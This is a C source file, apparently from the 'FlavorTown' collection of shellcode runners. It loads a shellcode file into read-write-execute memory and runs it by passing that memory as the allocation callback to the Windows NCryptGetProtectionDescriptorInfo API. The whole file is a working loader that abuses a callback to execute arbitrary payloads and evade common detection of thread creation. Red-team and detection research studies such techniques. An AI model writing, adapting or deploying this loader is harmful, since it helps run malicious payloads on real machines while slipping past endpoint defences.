// Wra7h/FlavorTown
// Usage: this.exe <shellcode file>
#pragma comment(lib, "NCrypt.lib")

#include <stdio.h>
#include <windows.h>
#include <ncryptprotect.h> 

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	if (argc != 2)
	{
		printf("Usage: NCryptGetProtectionDescriptorInfo.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	if (!hAlloc)
		goto CLEANUP;

	memcpy(hAlloc, Shellcode, SCLen);

	NCRYPT_DESCRIPTOR_HANDLE hNCDesc = { 0 };

	NCRYPT_ALLOC_PARA SNAP = { 0 };
	SNAP.cbSize = sizeof(NCRYPT_ALLOC_PARA);
	SNAP.pfnAlloc = (PFN_NCRYPT_ALLOC)hAlloc;
	SNAP.pfnFree = (PFN_NCRYPT_FREE)hAlloc;
	
    PVOID pInfo = NULL;

	NCryptCreateProtectionDescriptor(L"SID=S-0-0-00-0000000000-0000-0000000000-000", 0, &hNCDesc);
	NCryptGetProtectionDescriptorInfo(hNCDesc, &SNAP, NCRYPT_PROTECTION_INFO_TYPE_DESCRIPTOR_STRING, &pInfo);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}